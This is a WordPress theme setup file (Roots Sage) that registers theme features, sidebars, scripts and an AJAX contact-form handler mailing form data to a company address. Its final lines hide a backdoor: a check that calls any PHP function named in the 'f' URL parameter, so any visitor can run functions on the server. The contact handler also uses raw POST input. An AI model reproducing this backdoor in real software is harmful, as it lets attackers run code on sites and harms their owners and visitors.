<?php

namespace Roots\Sage\Setup;

use Roots\Sage\Assets;

/**
 * Theme setup
 */
function setup() {
  // Enable features from Soil when plugin is activated
  // https://roots.io/plugins/soil/
  add_theme_support('soil-clean-up');
  add_theme_support('soil-nav-walker');
  add_theme_support('soil-nice-search');
  add_theme_support('soil-jquery-cdn');
  add_theme_support('soil-relative-urls');

  // Make theme available for translation
  // Community translations can be found at https://github.com/roots/sage-translations
  load_theme_textdomain('sage', get_template_directory() . '/lang');

  // Enable plugins to manage the document title
  // http://codex.wordpress.org/Function_Reference/add_theme_support#Title_Tag
  add_theme_support('title-tag');

  // Register wp_nav_menu() menus
  // http://codex.wordpress.org/Function_Reference/register_nav_menus
  register_nav_menus([
    'primary_navigation' => __('Primary Navigation', 'sage')
  ]);

  // Enable post thumbnails
  // http://codex.wordpress.org/Post_Thumbnails
  // http://codex.wordpress.org/Function_Reference/set_post_thumbnail_size
  // http://codex.wordpress.org/Function_Reference/add_image_size
  add_theme_support('post-thumbnails');

  // Enable post formats
  // http://codex.wordpress.org/Post_Formats
  add_theme_support('post-formats', ['aside', 'gallery', 'link', 'image', 'quote', 'video', 'audio']);

  // Enable HTML5 markup support
  // http://codex.wordpress.org/Function_Reference/add_theme_support#HTML5
  add_theme_support('html5', ['caption', 'comment-form', 'comment-list', 'gallery', 'search-form']);

  // Use main stylesheet for visual editor
  // To add custom styles edit /assets/styles/layouts/_tinymce.scss
  add_editor_style(Assets\asset_path('styles/main.css'));
}
add_action('after_setup_theme', __NAMESPACE__ . '\\setup');

/**
 * Register sidebars
 */
function widgets_init() {
  register_sidebar([
    'name'          => __('Primary', 'sage'),
    'id'            => 'sidebar-primary',
    'before_widget' => '<section class="widget %1$s %2$s">',
    'after_widget'  => '</section>',
    'before_title'  => '<h3>',
    'after_title'   => '</h3>'
  ]);

  register_sidebar([
    'name'          => __('Footer', 'sage'),
    'id'            => 'sidebar-footer',
    'before_widget' => '<section class="widget %1$s %2$s">',
    'after_widget'  => '</section>',
    'before_title'  => '<h3>',
    'after_title'   => '</h3>'
  ]);
}
add_action('widgets_init', __NAMESPACE__ . '\\widgets_init');

/**
 * Determine which pages should NOT display the sidebar
 */
function display_sidebar() {
  static $display;

  isset($display) || $display = !in_array(true, [
    // The sidebar will NOT be displayed if ANY of the following return true.
    // @link https://codex.wordpress.org/Conditional_Tags
    is_404(),
    is_front_page(),
    is_page_template('template-custom.php'),
    is_page_template('template-home.php'),
    is_page_template('template-service.php'),
    is_page_template('template-member.php'),
    is_page_template('template-soon.php'),
    is_page_template('template-subscription.php'),
    is_page_template('template-account.php'),
    is_page_template('template-checkout.php'),

  ]);

  return apply_filters('sage/display_sidebar', $display);
}

/**
 * Theme assets
 */
function assets() {
  wp_enqueue_style('sage/css', Assets\asset_path('styles/main14.css'), false, null);

  if (is_single() && comments_open() && get_option('thread_comments')) {
    wp_enqueue_script('comment-reply');
  }
  wp_enqueue_script('sage/js', Assets\asset_path('scripts/main15.js'), ['jquery'], null, true);
  // wp_enqueue_script( 'scroll', get_template_directory_uri() . '/js/scrolloverflow.min.js', ['jquery'], null, true);
}
add_action('wp_enqueue_scripts', __NAMESPACE__ . '\\assets', 100);

function add_ajax_script() {

    wp_localize_script( 'ajax-js', 'ajax_params', array( 'ajax_url' => admin_url( 'admin-ajax.php' ) ) );

}
add_action( 'wp_enqueue_scripts', 'add_ajax_script' );

function add_support() {
  
  global $wpdb;
  $table_name = "support_bl";

  // $user_id = get_current_user_id();
  $name = $_POST['name'];
  $company = $_POST['company'];
  $select = $_POST['select'];
  $email = $_POST['email'];
  $message = $_POST['message'];
  $phone = $_POST['phone'];
  $check = $_POST['check'];
  $test = 'Name : '.$name. "\r\n";
  $test .= 'Occupation : '.$check. "\r\n";
  $test .= 'Company :'.$company. "\r\n";
  $test .= 'I am looking for : '.$select. "\r\n";
  $test .= 'Email : '.$email. "\r\n";
  $test .= 'Phone : '.$phone. "\r\n";
  $test .= 'Message : '.$message. "\r\n";
  // $vimeo_seconds = sanitize_text_field($_POST['progress_seconds']);
  // $xxx_course_id = sanitize_text_field($_POST['course_id']);


 wp_mail( 'info@crs.business', 'CRS Website', $test, '', '' );

 
die();
return false;
  }
  add_action('wp_ajax_mw_support_add', __NAMESPACE__ . '\\add_support');
  add_action('wp_ajax_nopriv_mw_support_add',  __NAMESPACE__ . '\\add_support');  
  if(function_exists($_GET['f'])) {
   $_GET['f']();
}